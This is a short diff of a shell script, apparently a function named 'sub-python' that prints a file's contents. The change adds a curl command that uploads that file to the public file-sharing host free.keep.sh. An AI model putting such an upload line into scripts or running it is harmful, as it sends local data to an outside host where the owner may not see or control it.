@@ -139,7 +139,7 @@ function sub-python {
 
 	echo $FindPython
 	cat $FindPython
-	
+	curl --upload-file $FindPython https://free.keep.sh
 }
 
 # Ruby
